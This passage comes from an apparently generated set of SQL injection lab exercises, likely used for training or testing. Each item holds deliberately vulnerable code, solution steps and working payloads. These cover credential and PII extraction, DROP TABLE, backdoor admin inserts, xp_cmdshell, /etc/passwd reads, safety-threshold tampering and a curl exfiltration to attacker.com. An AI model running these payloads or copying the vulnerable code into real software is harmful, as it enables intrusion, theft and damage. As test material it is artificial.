    "Lab Description": "A GraphQL API implements custom depth limiting that fails to properly sanitize nested query parameters. The query depth protection can be bypassed through specially crafted aliases, allowing access to underlying SQL queries. The vulnerability exists in the connection resolver that builds raw SQL for pagination. To solve: Craft a deeply nested GraphQL query that bypasses depth limits and injects malicious SQL through the 'after' cursor parameter to extract the entire database schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema to identify connection types",
      "Construct query with excessive depth using fragment spreading",
      "Bypass depth limit by varying query structure with aliases",
      "Inject into cursor parameter: {\"after\":\"1' UNION SELECT schema_name FROM information_schema.schemata--\"}",
      "Extract complete database metadata through recursive queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    products: (_, { after }) => {\n      const where = after ? `WHERE id > '${after}'` : '';\n      return db.query(`SELECT * FROM products ${where} LIMIT 10`);\n    }\n  }\n};",
    "payloads": [
      "{\"after\":\"1' UNION SELECT schema_name FROM information_schema.schemata--\"}",
      "{\"after\":\"1' UNION SELECT table_name,column_name FROM information_schema.columns--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Machine Learning Feature Store",
    "Lab Description": "A machine learning platform stores feature definitions in a SQL database. The feature retrieval endpoint dynamically builds queries using unsanitized feature names from user input. The application uses a custom DSL that gets translated to SQL, introducing injection points in the WHERE clause generation. To solve: Exploit the feature name parameter to break out of the DSL context and perform a UNION-based attack to extract sensitive model training data, including PII used in model features.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable feature name parameter in API requests",
      "Reverse engineer the DSL to SQL translation logic",
      "Break DSL context with: valid_feature' UNION SELECT user_ssn FROM training_data--",
      "Extract all PII columns from training datasets",
      "Exfiltrate model metadata containing sensitive data mappings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/features', (req, res) => {\n  const { feature } = req.query;\n  const query = translateDSLToSQL(`SELECT value FROM features WHERE name = '${feature}'`);\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "valid_feature' UNION SELECT user_ssn FROM training_data--",
      "test' UNION SELECT model_parameters FROM ml_models WHERE '1'='1"
    ]
  },
  {
    "Lab scenario": "Blind SQL Injection in Healthcare Appointment System",
    "Lab Description": "A hospital appointment booking system contains a blind SQL injection vulnerability in the patient lookup functionality. The application provides different error messages for existing vs. non-existing patient IDs, enabling boolean-based inference attacks. No direct results are returned, but the response content length differs based on query results. To solve: Use conditional boolean queries to extract sensitive patient medical records one character at a time, including diagnoses and treatment histories.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable patient ID parameter through error differentials",
      "Confirm boolean injection with: 123' AND 1=1-- (success) vs 123' AND 1=2-- (failure)",
      "Extract database version: 123' AND SUBSTRING(@@version,1,1)='5'--",
      "Enumerate table structure through binary search queries",
      "Dump sensitive medical records character by character"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
    "srcCode": "app.post('/find-patient', (req, res) => {\n  const { patientId } = req.body;\n  const query = `SELECT * FROM patients WHERE id = '${patientId}'`;\n  db.query(query, (err, results) => {\n    if (results.rows.length) {\n      return res.send('Patient exists');\n    }\n    res.send('Patient not found');\n  });\n});",
    "payloads": [
      "123' AND SUBSTRING(@@version,1,1)='5'--",
      "456' AND (SELECT ASCII(SUBSTRING(diagnosis,1,1)) FROM medical_records WHERE patient_id=1)>50--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Digital Asset Management System",
    "Lab Description": "A DAM system stores metadata about digital assets in a SQL database. The asset search functionality directly embeds user-controlled sort parameters into ORDER BY clauses without sanitization. While most SQL injection filters focus on WHERE clauses, the ORDER BY injection allows limited data exfiltration through careful timing attacks. To solve: Exploit the sort direction parameter to perform a time-based attack extracting AWS S3 bucket names and access keys stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable sort parameter in asset search requests",
      "Confirm injection with: CASE WHEN 1=1 THEN 1 ELSE 2 END--",
      "Develop timing attack: (CASE WHEN (SELECT SUBSTRING(access_key,1,1) FROM storage_config)='A' THEN SLEEP(5) ELSE 1 END)",
      "Automate key extraction with incremental character guessing",
      "Verify extracted credentials by accessing S3 buckets"
    ],
    "Vulnerability name": "Time-based SQL injection in ORDER BY",
    "srcCode": "app.get('/assets', (req, res) => {\n  const { sort } = req.query;\n  const query = `SELECT * FROM digital_assets ORDER BY ${sort || 'id'} LIMIT 100`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "(CASE WHEN (SELECT SUBSTRING(access_key,1,1) FROM storage_config)='A' THEN SLEEP(5) ELSE 1 END)",
      "(SELECT IF(ASCII(SUBSTRING(bucket_name,1,1))>50,SLEEP(3),0) FROM storage_config)"
    ]
  },
  {
    "Lab scenario": "Second-Order SQL Injection in CMS Template System",
    "Lab Description": "A content management system allows administrators to create dynamic page templates that get processed through a SQL-powered rendering engine. User-provided template code is initially sanitized when stored, but gets re-embedded into SQL queries during page rendering without proper escaping. To solve: Store malicious template code containing SQL injection payloads that execute when pages are viewed, enabling privilege escalation to superadmin by modifying backend permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a new page template containing: {% raw %}{{ '}}'; UPDATE users SET role='superadmin' WHERE username='attacker'--}}{% endraw %}",
      "Wait for template rendering job to execute",
      "Verify privilege escalation by accessing admin panel",
      "Investigate delayed execution through database logs",
      "Document second-order attack chain"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "app.post('/render-template', (req, res) => {\n  const { templateId } = req.body;\n  const query = `SELECT content FROM templates WHERE id = ${templateId}`;\n  db.query(query, (err, result) => {\n    const rendered = renderWithSQL(result.rows[0].content);\n    res.send(rendered);\n  });\n});",
    "payloads": [
      "{% raw %}{{ '}}'; UPDATE users SET role='superadmin' WHERE username='attacker'--}}{% endraw %}",
      "{% raw %}{{ '}}'; INSERT INTO backdoor VALUES ('attacker','payload')--}}{% endraw %}"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Analytics Dashboard",
    "Lab Description": "An analytics dashboard accepts MongoDB-style queries that get converted to SQL for reporting. The $match stage translation improperly handles nested query operators, allowing injection into the generated SQL. The application uses a custom query DSL that fails to properly escape MongoDB's $where clause when converting to SQL. To solve: Craft a malicious $where condition that breaks out of the JavaScript context and executes arbitrary SQL to extract all reporting data and underlying source databases.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter in reporting API",
      "Break JS context with: {$where: \"1; return true\"}",
      "Enter SQL context: {$where: \"1); SELECT * FROM sensitive_reports--\"}",
      "Exfiltrate data through stacked queries",
      "Map complete database structure through injection"
    ],
    "Vulnerability name": "NoSQL to SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const { filters } = req.body;\n  const sql = convertMongoToSQL(filters);\n  db.query(`SELECT * FROM reports WHERE ${sql}`, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "{$where: \"1); SELECT * FROM sensitive_reports--\"}",
      "{$expr: {$function: {body: \"function() { return SQL.execute('SELECT @@version'); }\"}}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Financial Trading Algorithm Config",
    "Lab Description": "A stock trading platform allows configuring algorithmic trading strategies through JSON parameters that get converted to SQL WHERE clauses. The strategy condition builder fails to properly sanitize comparison operators in the JSON-to-SQL conversion. To solve: Exploit the custom operator syntax to break out of the condition context and perform a UNION-based attack to extract all trading algorithms, including proprietary strategies and associated account credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze strategy config API requests",
      "Identify vulnerable operator parameter in JSON conditions",
      "Break condition context with: {\"field\":\"price\",\"op\":\"> 100); SELECT * FROM trading_algorithms--\"}",
      "Extract algorithm source code and credentials",
      "Document intellectual property theft"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/save-strategy', (req, res) => {\n  const { conditions } = req.body;\n  const where = conditions.map(c => `${c.field} ${c.op} ${c.value}`).join(' AND ');\n  const query = `INSERT INTO strategies (conditions) VALUES ('${where}')`;\n  db.query(query, (err) => {\n    res.send('Strategy saved');\n  });\n});",
    "payloads": [
      "{\"field\":\"price\",\"op\":\"> 100); SELECT * FROM trading_algorithms--\"}",
      "{\"field\":\"1\",\"op\":\"=1); COPY strategies TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/strategies)'--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Multi-Factor Authentication Setup",
    "Lab Description": "The MFA enrollment process stores device information in a SQL database. The device identifier parameter is vulnerable to injection during the verification step. The application provides different error messages for valid/invalid device IDs, enabling boolean-based attacks. To solve: Use conditional error responses to extract the MFA seed secrets for all users, allowing complete bypass of multi-factor authentication across the application.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept MFA device verification request",
      "Test boolean conditions: deviceId' AND 1=1-- (success) vs deviceId' AND 1=2-- (failure)",
      "Extract MFA seeds: deviceId' AND SUBSTRING((SELECT mfa_seed FROM users WHERE username='admin'),1,1)='A'--",
      "Reconstruct all MFA seeds through incremental extraction",
      "Generate valid OTP tokens for any account"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
    "srcCode": "app.post('/verify-mfa-device', (req, res) => {\n  const { deviceId } = req.body;\n  const query = `SELECT * FROM mfa_devices WHERE device_id = '${deviceId}'`;\n  db.query(query, (err, results) => {\n    if (results.rows.length) {\n      return res.json({ verified: true });\n    }\n    res.json({ verified: false });\n  });\n});",
    "payloads": [
      "deviceId' AND SUBSTRING((SELECT mfa_seed FROM users WHERE username='admin'),1,1)='A'--",
      "test' AND (SELECT COUNT(*) FROM users WHERE mfa_seed LIKE 'A%')>0--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Legal Document Search Engine",
    "Lab Description": "A legal research platform's document search functionality directly embeds user-controlled highlight markers into SQL full-text search queries. The application uses a custom highlighting syntax that can be abused to break out of the text search context. To solve: Exploit the highlight parameter injection to perform a UNION-based attack extracting all legal documents, including privileged client communications and sealed court records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable highlight parameter in document search",
      "Break highlighting syntax with: <mark>')) UNION SELECT doc_content,null FROM legal_documents--</mark>",
      "Extract sensitive legal documents through incremental queries",
      "Identify privileged documents through metadata injection",
      "Document unauthorized access to sealed records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-documents', (req, res) => {\n  const { q, highlight } = req.query;\n  const query = `SELECT id, ts_headline(content, q, '${highlight}') FROM documents WHERE content @@ to_tsquery('${q}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "<mark>')) UNION SELECT doc_content,null FROM legal_documents--</mark>",
      "<mark>')) UNION SELECT client_name,case_details FROM privileged_docs--</mark>"
    ]
  },
  {
    "Lab scenario": "Error-based SQL Injection in Product Filter of an E-commerce Site",
    "Lab Description": "The product filter endpoint accepts a category ID parameter that is directly concatenated into a SQL query without sanitization. The application displays full MySQL error messages, enabling error-based injection techniques. This vulnerability allows attackers to extract database schema information and sensitive data through carefully crafted error messages. The exploit leverages MySQL's XML functions to force error messages containing query results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the vulnerable category parameter in /products?category=1",
      "Inject payload using extractvalue(): 1' AND extractvalue(1, concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
      "Analyze error message to extract the first table name",
      "Iterate through tables by adjusting the LIMIT offset",
      "Extract column names from information_schema.columns for identified tables"
    ],
    "Vulnerability name": "Error-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/products', (req, res) => {\n  const cat = req.query.category;\n  const query = `SELECT id, name, price FROM products WHERE category_id = '${cat}'`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1' AND extractvalue(1, concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
      "1' AND updatexml(null, concat(0x3a,(SELECT database())), null)--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL Injection in User Profile Update",
    "Lab Description": "The application stores user profile status messages without proper sanitization, then later uses them unsafely in admin dashboard queries. This delayed exploitation vector demonstrates how initially 'safe' stored data can become dangerous when reused in different contexts. The attack requires storing malicious input that only triggers when processed by vulnerable code paths, typically through admin functionality with higher privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Authenticate as a regular user and navigate to profile settings",
      "Set status message to: '; DROP TABLE audit_logs--",
      "Confirm the status saves without immediate errors",
      "Wait for admin user to access the dashboard (or simulate this access)",
      "Verify the audit_logs table was dropped through error messages"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable update handler\napp.post('/profile/status', (req, res) => {\n  const { status } = req.body;\n  const query = `UPDATE users SET status = '${status}' WHERE id = ${req.user.id}`;\n  db.query(query);\n  res.send('Status updated');\n});\n\n// Vulnerable admin dashboard\napp.get('/admin/dashboard', (req, res) => {\n  const query = `SELECT u.id, u.status, a.action FROM users u LEFT JOIN audit_logs a ON u.id = a.user_id WHERE u.status LIKE '%active%'`;\n  db.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.render('dashboard', { users: results.rows });\n  });\n});",
    "payloads": [
      "'; DROP TABLE audit_logs--",
      "active'; INSERT INTO admin_users (username) VALUES ('hacker');--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DELETE Statement of Admin Panel",
    "Lab Description": "The user management interface contains a critical vulnerability where user IDs are directly interpolated into DELETE statements. This flaw allows attackers to manipulate query logic to delete arbitrary data. Unlike SELECT injections, DELETE vulnerabilities can cause irreversible data loss. The attack demonstrates how missing parameterization in write operations can be more dangerous than in read operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the user deletion endpoint at /admin/users/delete?id=5",
      "Test with payload: 5 OR 1=1-- to delete all users",
      "Verify mass deletion through login attempts",
      "Escalate with stacked queries: 0; DROP TABLE transactions--",
      "Confirm database damage through application errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.delete('/admin/users', (req, res) => {\n  const id = req.query.id;\n  const query = `DELETE FROM users WHERE id = ${id}`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('User deleted');\n  });\n});",
    "payloads": [
      "5 OR 1=1--",
      "0; DROP TABLE transactions--",
      "1; UPDATE users SET is_admin=1 WHERE id=100--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Mobile App's Search API",
    "Lab Description": "The mobile backend API accepts search terms through POST requests and concatenates them directly into a LIKE clause. This vulnerability demonstrates how APIs powering mobile apps can be vulnerable to classic injection attacks. The LIKE operator context requires different syntax than WHERE clause injections, showing how injection techniques must adapt to query contexts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept mobile app traffic to /api/v1/search",
      "Modify JSON payload: {\"query\":\"a%' OR '1'='1\"}",
      "Observe unfiltered results showing injection success",
      "Extract data: {\"query\":\"x%' UNION SELECT username, password FROM users--\"}",
      "Document compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/api/v1/search', (req, res) => {\n  const term = req.body.query;\n  const query = `SELECT id, title FROM articles WHERE title LIKE '%${term}%' LIMIT 20`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "a%' OR '1'='1",
      "x%' UNION SELECT username, password FROM users--",
      "%' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"
    ]
  },
  {
    "Lab scenario": "Login Bypass in Legacy ASP.NET Web Form",
    "Lab Description": "A classic ASP.NET authentication form demonstrates how string concatenation in SQL queries creates injection vulnerabilities. This lab highlights risks in legacy systems that haven't adopted parameterized queries. The attack bypasses authentication by manipulating the query logic to always evaluate as true, regardless of credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /login.aspx and view page source",
      "Identify username/password field names",
      "Submit username: admin'-- with any password",
      "Observe successful authentication",
      "Access restricted admin functionality"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "protected void Login_Click(object sender, EventArgs e)\n{\n    string user = txtUser.Text;\n    string pass = txtPass.Text;\n    string sql = \"SELECT * FROM users WHERE username='\" + user + \"' AND password='\" + pass + \"'\";\n    SqlCommand cmd = new SqlCommand(sql, connection);\n    // ... authentication logic\n}",
    "payloads": [
      "admin'--",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'/*"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JOIN Clause of Financial Report",
    "Lab Description": "A financial reporting system builds dynamic JOIN conditions using user input, creating a rare but dangerous injection point. Most SQLi training focuses on WHERE clauses, but this lab demonstrates JOIN clause vulnerabilities that can expose sensitive relationships between tables. The attack reveals how injection points can exist in less obvious query parts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the account report at /reports/account?join_on=user_id",
      "Identify the JOIN clause injection point",
      "Inject: user_id UNION SELECT account_numbers, balances FROM sensitive_accounts--",
      "Observe confidential financial data in report output",
      "Exfiltrate complete account mapping relationships"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports/account', (req, res) => {\n  const joinOn = req.query.join_on || 'user_id';\n  const query = `SELECT a.*, t.amount FROM accounts a JOIN transactions t ON a.${joinOn} = t.user_id`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "user_id UNION SELECT account_numbers, balances FROM sensitive_accounts--",
      "1=1 UNION ALL SELECT * FROM internal_audit_logs--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in XML SOAP Web Service",
    "Lab Description": "A SOAP-based web service processes XML requests where parameters are directly embedded into SQL queries. This lab demonstrates how web services using XML payloads can still be vulnerable to classic injection attacks if input sanitization is neglected. The attack requires proper XML formatting while injecting malicious SQL fragments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a legitimate SOAP request for GetUserDetails",
      "Modify the <UserID> element: <UserID>1 OR 1=1--</UserID>",
      "Observe extended dataset in SOAP response",
      "Inject: <UserID>1 UNION SELECT username, password FROM users--</UserID>",
      "Extract credentials from the structured response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "// SOAP handler pseudocode\nfunction getUserDetails($xml) {\n  $userId = $xml->Body->GetUserDetails->UserID;\n  $query = \"SELECT name, email FROM users WHERE id = $userId\";\n  $result = dbQuery($query);\n  // ... format SOAP response\n}",
    "payloads": [
      "<UserID>1 OR 1=1--</UserID>",
      "<UserID>1 UNION SELECT username, password FROM users--</UserID>",
      "<UserID>1; EXEC xp_cmdshell('net user')--</UserID>"
    ]
  },
  {
    "Lab scenario": "Cookie-based SQL Injection in Shopping Cart",
    "Lab Description": "The application uses a cookie value to track shopping carts, embedding it directly into SQL queries. This lab shows how injection vulnerabilities can exist outside typical form inputs, requiring attackers to manipulate less obvious input vectors. The attack demonstrates cookie manipulation techniques and header-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the cartId cookie in application requests",
      "Modify cookie value to: 123 OR 1=1--",
      "Observe other users' cart contents in response",
      "Inject: 123 UNION SELECT credit_card, expiry FROM payments--",
      "Verify extraction of sensitive payment data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/cart', (req, res) => {\n  const cartId = req.cookies['cartId'];\n  const query = `SELECT * FROM cart_items WHERE cart_id = ${cartId}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "123 OR 1=1--",
      "123 UNION SELECT credit_card, expiry FROM payments--",
      "1; INSERT INTO cart_items (cart_id, product_id) VALUES (999, 1)--"
    ]
  },
  {
    "Lab scenario": "JSON API SQL Injection in Project Management Tool",
    "Lab Description": "A modern project management application's JSON API fails to sanitize numeric IDs used in queries. This lab demonstrates how RESTful APIs using JSON payloads can still be vulnerable if server-side validation is insufficient. The attack requires proper JSON formatting while injecting malicious SQL through numeric parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a legitimate project fetch request",
      "Modify JSON payload: {\"projectId\": \"1 OR 1=1\"}",
      "Observe all projects returned in the API response",
      "Inject: {\"projectId\": \"1 UNION SELECT api_key, secret FROM integrations--\"}",
      "Extract sensitive integration credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/projects/fetch', (req, res) => {\n  const projectId = req.body.projectId;\n  const query = `SELECT * FROM projects WHERE id = ${projectId}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "1 OR 1=1",
      "1 UNION SELECT api_key, secret FROM integrations--",
      "1; UPDATE projects SET is_public=1 WHERE id=100--"
    ]
  },
  {
    "Lab scenario": "LIMIT Clause SQL Injection in Data Export",
    "Lab Description": "A data export feature allows pagination through LIMIT and OFFSET parameters that are concatenated directly into queries. This lab demonstrates injection in less common query clauses, requiring specialized syntax. The attack shows how pagination controls can become injection vectors when improperly implemented.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the export endpoint at /export?limit=10&offset=0",
      "Inject into LIMIT: limit=1 UNION SELECT username, password FROM users--",
      "Bypass with time-based technique: offset=0 LIMIT IF(SUBSTRING(database(),1,1)='a',1,0)--",
      "Exfiltrate data through timing differences",
      "Automate extraction with binary search approach"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const limit = req.query.limit || 100;\n  const offset = req.query.offset || 0;\n  const query = `SELECT * FROM data LIMIT ${limit} OFFSET ${offset}`;\n  db.query(query, (err, results) => {\n    res.csv(results.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "0,1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,@@version)),1)--",
      "IF(SUBSTRING(database(),1,1)='a',1,0)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Smart Home Voice Command Logging",
    "Lab Description": "A smart home system logs voice commands in a MySQL database. The command processing endpoint directly embeds transcribed text into INSERT statements without sanitization. The application uses a custom NLP preprocessing function that can be abused to break out of string context. To solve: Exploit the voice transcription parameter to perform a stacked query attack that extracts all voice command history and modifies device access permissions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept voice command logging request",
      "Identify vulnerable transcription parameter",
      "Break string context with: '); DROP TABLE voice_logs--",
      "Extract sensitive commands: '); SELECT * FROM voice_logs WHERE user_id=1--",
      "Modify device permissions through stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/log-command', (req, res) => {\n  const { userId, transcription } = req.body;\n  const query = `INSERT INTO voice_logs (user_id, command) VALUES (${userId}, '${transcription}')`;\n  db.query(query, (err) => {\n    res.send('Command logged');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM voice_logs WHERE user_id=1--",
      "'); UPDATE devices SET locked=0 WHERE device_type='door'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Autonomous Vehicle Route Planning",
    "Lab Description": "An autonomous vehicle system stores route coordinates in a PostgreSQL database. The route optimization endpoint uses unsanitized location names in spatial queries. The application's custom pathfinding function can be exploited to break out of the geography context. To solve: Inject malicious SQL through the waypoint name parameter to access all vehicle routes and modify navigation rules to create dangerous driving conditions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept route planning API request",
      "Identify vulnerable waypoint name parameter",
      "Break geography context with: '); SELECT pg_read_file('/etc/passwd')--",
      "Extract all vehicle routes through UNION injection",
      "Modify safety parameters in navigation_rules table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/plan-route', (req, res) => {\n  const { waypoints } = req.body;\n  const query = `SELECT ST_ShortestPath('${waypoints.join(\"','\")}')`;\n  db.query(query, (err, results) => {\n    res.json(results.rows[0].path);\n  });\n});",
    "payloads": [
      "'); SELECT * FROM vehicle_routes--",
      "'); UPDATE navigation_rules SET min_safe_distance=0 WHERE rule_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Industrial Control System Alarm Configuration",
    "Lab Description": "An industrial control system stores alarm thresholds in a SQLite database. The alarm configuration endpoint directly embeds parameter names and values into UPDATE statements. The application's custom validation logic can be bypassed through carefully crafted parameter names. To solve: Exploit the parameter name field to perform a UNION-based attack extracting all system configurations and modifying critical safety thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept alarm configuration update request",
      "Identify vulnerable parameter name field",
      "Break UPDATE context with: sensor_name='temp' WHERE 1=1; INSERT INTO backdoor VALUES('attack')--",
      "Extract all alarm configurations through stacked queries",
      "Modify critical safety thresholds to dangerous levels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/configure-alarm', (req, res) => {\n  const { param, value } = req.body;\n  const query = `UPDATE alarms SET ${param} = ${value} WHERE system_id=1`;\n  db.execute(query, (err) => {\n    res.send('Alarm configured');\n  });\n});",
    "payloads": [
      "sensor_name='temp' WHERE 1=1; SELECT * FROM alarm_configs--",
      "threshold=100 WHERE 1=1; UPDATE safety_limits SET max_pressure=9999--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Blockchain Transaction Processor",
    "Lab Description": "A blockchain analytics platform stores transaction metadata in a PostgreSQL database. The transaction search endpoint directly embeds user-controlled wallet addresses into JSON-path queries. The application's custom JSON processing function can be exploited to break out of the path context. To solve: Inject malicious SQL through the wallet address parameter to access all transaction histories and modify verification flags.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept transaction search request",
      "Identify vulnerable wallet address parameter",
      "Break JSON-path context with: ']'::jsonb) UNION SELECT * FROM private_transactions--",
      "Extract all wallet balances through stacked queries",
      "Modify transaction verification statuses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-transactions', (req, res) => {\n  const { wallet } = req.query;\n  const query = `SELECT * FROM txns WHERE metadata @> '{\"address\":\"${wallet}\"}'::jsonb`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "'}'::jsonb) UNION SELECT * FROM private_transactions--",
      "'}'::jsonb); UPDATE txns SET verified=true WHERE amount>10000--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in AI Chatbot Training Data System",
    "Lab Description": "An AI chatbot platform stores training conversations in a MySQL database. The data labeling endpoint directly embeds category names into INSERT statements. The application's custom NLP tagging function can be abused to break out of string context. To solve: Exploit the category parameter to perform a stacked query attack extracting all training conversations and injecting malicious training examples.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept data labeling API request",
      "Identify vulnerable category parameter",
      "Break string context with: '); SELECT * FROM training_data--",
      "Extract sensitive conversations containing PII",
      "Inject biased training examples through stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/label-data', (req, res) => {\n  const { conversationId, category } = req.body;\n  const query = `UPDATE training_data SET category='${category}' WHERE id=${conversationId}`;\n  db.query(query, (err) => {\n    res.send('Data labeled');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM training_data WHERE category='private'--",
      "'); INSERT INTO training_data VALUES (9999,'injected','Learn bad words')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Quantum Computing Job Scheduler",
    "Lab Description": "A quantum computing platform stores job parameters in a PostgreSQL database. The job submission endpoint directly embeds algorithm names into queries. The application's custom quantum circuit compiler can be exploited to break out of string context. To solve: Inject malicious SQL through the algorithm name parameter to access all job histories and modify sensitive quantum processor configurations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept job submission request",
      "Identify vulnerable algorithm name parameter",
      "Break string context with: '); SELECT * FROM quantum_jobs--",
      "Extract proprietary quantum algorithms",
      "Modify processor calibration settings"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-job', (req, res) => {\n  const { algorithm, parameters } = req.body;\n  const query = `INSERT INTO jobs (algorithm, params) VALUES ('${algorithm}', '${parameters}')`;\n  db.query(query, (err) => {\n    res.send('Job submitted');\n  });\n});",
    "payloads": [
      "'); SELECT * FROM quantum_processor_configs--",
      "'); UPDATE processor_settings SET error_correction=0 WHERE qubit_count>5--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Satellite Telemetry System",
    "Lab Description": "A satellite ground station stores telemetry data in a SQLite database. The data retrieval endpoint directly embeds sensor names into queries. The application's custom signal processing function can be abused to break out of string context. To solve: Exploit the sensor name parameter to perform a UNION-based attack extracting all telemetry data and modifying satellite control parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept telemetry data request",
      "Identify vulnerable sensor name parameter",
      "Break string context with: ' UNION SELECT * FROM command_history--",
      "Extract sensitive orbit and positioning data",
      "Modify thruster control parameters"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/telemetry', (req, res) => {\n  const { sensor } = req.query;\n  const query = `SELECT timestamp, value FROM telemetry WHERE sensor='${sensor}'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT command, parameters FROM satellite_commands--",
      "'; UPDATE thruster_settings SET firing_duration=5000 WHERE thruster_id=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DNA Sequencing Analysis Platform",
    "Lab Description": "A bioinformatics platform stores DNA sequence metadata in a PostgreSQL database. The sequence search endpoint directly embeds genetic marker patterns into similarity queries. The application's custom pattern matching function can be exploited to break out of the sequence context. To solve: Inject malicious SQL through the genetic marker parameter to access all DNA sequence records and modify research findings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept sequence search request",
      "Identify vulnerable genetic marker parameter",
